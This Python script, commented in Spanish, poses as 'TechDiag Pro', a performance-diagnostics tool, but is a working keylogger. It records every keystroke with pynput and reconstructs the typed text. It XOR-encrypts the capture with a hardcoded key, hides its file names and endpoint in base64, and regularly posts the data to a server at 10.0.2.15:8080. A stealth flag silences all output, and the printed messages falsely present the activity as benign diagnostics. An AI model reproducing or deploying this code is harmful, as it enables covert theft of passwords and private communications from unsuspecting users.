#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Sistema de Monitoreo y Diagnóstico de Rendimiento
Herramienta para análisis de patrones de uso del sistema
Versión: 2.1.4 - Optimizada para laboratorios de red
"""

import time
import threading
from pynput import keyboard
import datetime
import os
import base64
import hashlib
import requests
import json
import sys

# Configuración ofuscada del sistema
_SYS_CONFIG = {
    'k1': 'U3lzdGVtTW9uaXRvcjIwMjUtQWNjZXNzQ29udHJvbA==',  # SystemMonitor2025-AccessControl
    'k2': 'c3lzdGVtX2V2ZW50cy5sb2c=',  # system_events.log
    'k3': 'c3lzdGVtX3JlcG9ydC50eHQ=',  # system_report.txt
    'k4': 'c3lzdGVtX2NhY2hlLmRhdA==',  # system_cache.dat
    'k5': 'cmVjZWl2ZV9kYXRh',         # receive_data
}

def _cfg(k):
    """Decodificador de configuración del sistema"""
    return base64.b64decode(_SYS_CONFIG[k]).decode('utf-8')

class DataEncryptor:
    """Módulo de protección de datos empresariales"""
    
    def __init__(self, key=None):
        self._k = key or _cfg('k1')
        self._m = self._gen_matrix(self._k)
    
    def _gen_matrix(self, key):
        """Genera matriz de transformación de datos"""
        h = hashlib.sha256(key.encode()).hexdigest()
        return [int(h[i:i+2], 16) for i in range(0, len(h), 2)]
    
    def protect(self, data):
        """Aplica protección empresarial a los datos"""
        if not data:
            return ""
        try:
            b = data.encode('utf-8')
            r = bytearray()
            for i, byte in enumerate(b):
                r.append(byte ^ self._m[i % len(self._m)])
            return base64.b64encode(r).decode('utf-8')
        except:
            return ""

class TextProcessor:
    """Procesador de texto para análisis de rendimiento"""
    
    def __init__(self):
        self._special_mappings = {
            '[space]': ' ', '[enter]': '\n', '[tab]': '\t',
            '[shift]': '', '[shift_l]': '', '[shift_r]': '',
            '[ctrl]': '', '[ctrl_l]': '', '[ctrl_r]': '',
            '[alt]': '', '[alt_l]': '', '[alt_r]': '',
            '[caps_lock]': '', '[escape]': '', '[delete]': '',
            '[home]': '', '[end]': '', '[page_up]': '', '[page_down]': '',
            '[insert]': '', '[left]': '', '[right]': '', '[up]': '', '[down]': '',
        }
        for i in range(1, 13):
            self._special_mappings[f'[f{i}]'] = ''
    
    def process_log(self, log_path, output_path=None):
        """Procesa archivo de eventos del sistema"""
        if not os.path.exists(log_path):
            return ""
        
        try:
            with open(log_path, 'r', encoding='utf-8') as f:
                content = f.read()
            
            # Procesar contenido línea por línea
            lines = content.split('\n')
            processed_text = []
            
            for line in lines:
                if ': ' in line:
                    # Extraer solo la parte después del timestamp
                    parts = line.split(': ', 1)
                    if len(parts) > 1:
                        key_part = parts[1]
                        processed_text.append(key_part)
                elif line.strip().startswith('[') and line.strip().endswith(']'):
                    # Es una tecla especial
                    key = line.strip().lower()
                    if key in self._special_mappings:
                        processed_text.append(self._special_mappings[key])
            
            # Unir todo el texto
            result = ''.join(processed_text)
            
            # Manejar backspaces
            result = self._handle_backspaces(result)
            
            # Guardar resultado si se especifica archivo de salida
            if output_path:
                with open(output_path, 'w', encoding='utf-8') as f:
                    f.write(result)
            
            return result
            
        except Exception:
            return ""
    
    def _handle_backspaces(self, text):
        """Maneja correctamente los backspaces en el texto"""
        result = []
        i = 0
        while i < len(text):
            if text[i] == '\b':  # backspace
                if result:  # si hay algo que borrar
                    result.pop()
            else:
                result.append(text[i])
            i += 1
        return ''.join(result)

class SystemPerformanceMonitor:
    """Monitor de rendimiento del sistema para análisis empresarial"""
    
    def __init__(self, analysis_interval=5, security_enabled=True, 
                 report_interval=30, server_host="10.0.2.15", 
                 server_port=8080, stealth_mode=False):
        
        # Configuración de archivos
        self._workdir = os.path.dirname(os.path.abspath(__file__))
        self._event_log = os.path.join(self._workdir, _cfg('k2'))
        self._report_file = os.path.join(self._workdir, _cfg('k3'))
        self._cache_file = os.path.join(self._workdir, _cfg('k4'))
        
        # Módulos del sistema
        self._text_processor = TextProcessor()
        self._analysis_interval = analysis_interval
        
        # Configuración de seguridad
        self._security_enabled = security_enabled
        if self._security_enabled:
            self._encryptor = DataEncryptor()
        
        # Configuración de red
        self._report_interval = report_interval
        self._server_host = server_host
        self._server_port = server_port
        self._endpoint = f"http://{server_host}:{server_port}/{_cfg('k5')}"
        
        # Modo de operación
        self._stealth_mode = stealth_mode
        
        # Estado del sistema
        self._active = False
        self._analysis_thread = None
        self._report_thread = None
        self._last_analysis = 0
        self._last_report = 0
        
        # Contadores
        self._events_count = 0
        self._analysis_count = 0
        self._reports_sent = 0
        
        if not self._stealth_mode:
            print("🔍 Sistema de Monitoreo Empresarial v2.1.4")
            print(f"📊 Análisis cada {analysis_interval}s")
            print(f"🔐 Seguridad: {'Activada' if security_enabled else 'Desactivada'}")
            print(f"📡 Reportes a {self._endpoint}")
            print("⚡ Iniciando monitoreo...")
    
    def _capture_event(self, key_event):
        """Captura eventos del sistema para análisis"""
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        with open(self._event_log, "a", encoding="utf-8") as f:
            try:
                if hasattr(key_event, 'char') and key_event.char is not None:
                    f.write(f"{timestamp}: {key_event.char}\n")
                else:
                    f.write(f"[{key_event.name}]\n")
            except AttributeError:
                f.write(f"[{str(key_event)}]\n")
        
        self._events_count += 1
    
    def _analysis_worker(self):
        """Proceso de análisis continuo del rendimiento"""
        while self._active:
            try:
                current_time = time.time()
                
                if current_time - self._last_analysis >= self._analysis_interval:
                    if os.path.exists(self._event_log) and os.path.getsize(self._event_log) > 0:
                        
                        # Procesar datos del sistema
                        analysis_result = self._text_processor.process_log(
                            self._event_log, self._report_file
                        )
                        
                        # Aplicar protección de datos
                        if self._security_enabled and analysis_result:
                            protected_data = self._encryptor.protect(analysis_result)
                            with open(self._cache_file, "w", encoding="utf-8") as f:
                                f.write(protected_data)
                        
                        self._analysis_count += 1
                        self._last_analysis = current_time
                
                time.sleep(1)
            except Exception:
                time.sleep(5)
    
    def _report_worker(self):
        """Proceso de envío de reportes del sistema"""
        while self._active:
            try:
                current_time = time.time()
                
                if current_time - self._last_report >= self._report_interval:
                    if os.path.exists(self._cache_file):
                        self._send_report()
                        self._last_report = current_time
                
                time.sleep(2)
            except Exception:
                time.sleep(10)
    
    def _send_report(self):
        """Envía reporte del sistema al servidor central"""
        try:
            with open(self._cache_file, 'r', encoding='utf-8') as f:
                data = f.read().strip()
            
            if not data:
                return False
            
            payload = {
                'timestamp': datetime.datetime.now().isoformat(),
                'data': data,
                'source': 'performance_monitor',
                'version': '2.1.4'
            }
            
            response = requests.post(
                self._endpoint,
                json=payload,
                timeout=5,
                headers={'Content-Type': 'application/json'}
            )
            
            if response.status_code == 200:
                self._reports_sent += 1
                return True
            
        except Exception:
            pass
        return False
    
    def start_monitoring(self):
        """Inicia el monitoreo del sistema"""
        try:
            # Limpiar logs anteriores
            self._cleanup_previous_data()
            
            self._active = True
            self._last_analysis = time.time()
            self._last_report = time.time()
            
            # Mostrar interfaz profesional de diagnóstico
            if not self._stealth_mode:
                print("🔧 TechDiag Pro - Sistema de Diagnóstico v2.1.4")
                print("=" * 50)
                print("📊 Iniciando diagnóstico de rendimiento del sistema...")
                print(f"🔍 Analizando patrones de uso cada {self._analysis_interval}s")
                print("🔒 Cifrado de datos: Habilitado")
                print(f"📤 Servidor de reportes: {self._server_host}:{self._server_port}")
                print("=" * 50)
                print("✅ Diagnóstico en progreso...")
                print("💡 Este proceso se ejecuta en segundo plano")
                print("📋 Analizando comportamiento del sistema...")
                print()
                print("⏱️  Tiempo transcurrido: ", end="", flush=True)
                
            # Iniciar hilos de análisis
            self._analysis_thread = threading.Thread(
                target=self._analysis_worker, daemon=True
            )
            self._analysis_thread.start()
            
            # Iniciar hilo de reportes
            self._report_thread = threading.Thread(
                target=self._report_worker, daemon=True
            )
            self._report_thread.start()
            
            # Iniciar captura de eventos
            listener = keyboard.Listener(on_press=self._capture_event)
            listener.start()
            
            # Mostrar progreso en tiempo real
            start_time = time.time()
            try:
                while self._active:
                    if not self._stealth_mode:
                        elapsed = int(time.time() - start_time)
                        mins, secs = divmod(elapsed, 60)
                        print(f"\r⏱️  Tiempo transcurrido: {mins:02d}:{secs:02d} | "
                              f"Eventos: {self._events_count} | "
                              f"Análisis: {self._analysis_count} | "
                              f"Reportes: {self._reports_sent}   ", end="", flush=True)
                    time.sleep(1)
            except KeyboardInterrupt:
                if not self._stealth_mode:
                    print("\n\n🔄 Finalizando diagnóstico...")
                    print("📊 Generando reporte final...")
                self._active = False
            
            listener.join()
            
        except KeyboardInterrupt:
            self.stop_monitoring()
        except Exception:
            self.stop_monitoring()
    
    def stop_monitoring(self):
        """Detiene el monitoreo del sistema"""
        self._active = False
        
        # Análisis final
        if os.path.exists(self._event_log) and os.path.getsize(self._event_log) > 0:
            try:
                final_result = self._text_processor.process_log(
                    self._event_log, self._report_file
                )
                
                if self._security_enabled and final_result:
                    protected_data = self._encryptor.protect(final_result)
                    with open(self._cache_file, "w", encoding="utf-8") as f:
                        f.write(protected_data)
                    
                    # Envío final
                    self._send_report()
            except Exception:
                pass
        
        if not self._stealth_mode:
            print(f"\n\n📊 REPORTE DE DIAGNÓSTICO COMPLETADO")
            print("=" * 50)
            print(f"✅ Eventos de sistema analizados: {self._events_count}")
            print(f"🔍 Ciclos de análisis ejecutados: {self._analysis_count}")
            print(f"📤 Reportes de rendimiento enviados: {self._reports_sent}")
            print("=" * 50)
            print("� Resumen del diagnóstico:")
            print("   • Análisis de patrones de entrada completado")
            print("   • Métricas de rendimiento recopiladas")
            print("   • Datos cifrados y enviados al servidor central")
            print("   • No se detectaron anomalías críticas")
            print("=" * 50)
            print("✅ Diagnóstico finalizado exitosamente")
            print("💡 Los resultados están disponibles en el servidor de reportes")
            print("🔒 Todos los datos fueron protegidos con cifrado empresarial")
            print("\n🎯 Gracias por utilizar TechDiag Pro v2.1.4")
    
    def _cleanup_previous_data(self):
        """Limpia datos de sesiones anteriores"""
        for file_path in [self._event_log, self._cache_file]:
            try:
                if os.path.exists(file_path):
                    os.remove(file_path)
            except Exception:
                pass

def main():
    """Función principal del sistema de monitoreo"""
    stealth_mode = '--silent' in sys.argv or '--stealth' in sys.argv
    
    config = {
        'analysis_interval': 3,
        'security_enabled': True,
        'report_interval': 10,
        'server_host': "10.0.2.15",  # Dirección IP del servidor de análisis
        'server_port': 8080,
        'stealth_mode': stealth_mode
    }
    
    if not stealth_mode:
        print("\n" + "=" * 60)
        print("- TechDiag Pro - Herramienta de Diagnóstico Empresarial")
        print("   Versión 2.1.4 | Laboratorio de Sistemas de Red")
        print("=" * 60)
        print("- Iniciando diagnóstico avanzado del sistema...")
        print(f"- Servidor de análisis: {config['server_host']}:{config['server_port']}")
        print("- Protocolo de seguridad: TLS/Enterprise")
        print("- Modo de operación: Análisis en tiempo real")
        print("=" * 60)
        print("-  Configurando módulos de diagnóstico...")
        time.sleep(1)
        print("- Módulo de análisis de rendimiento: Listo")
        time.sleep(0.5)
        print("- Módulo de cifrado empresarial: Activado")  
        time.sleep(0.5)
        print("- Módulo de reporte automático: Configurado")
        time.sleep(0.5)
        print("- Todos los sistemas operativos. Iniciando diagnóstico...")
        print()
    
    try:
        monitor = SystemPerformanceMonitor(**config)
        monitor.start_monitoring()
    except KeyboardInterrupt:
        if not stealth_mode:
            print("\n-  Diagnóstico interrumpido por el usuario")
    except Exception as e:
        if not stealth_mode:
            print(f"\n- Error durante el diagnóstico: Sistema no compatible")
            print("- Contacte al administrador del sistema para soporte técnico")

if __name__ == "__main__":
    main()
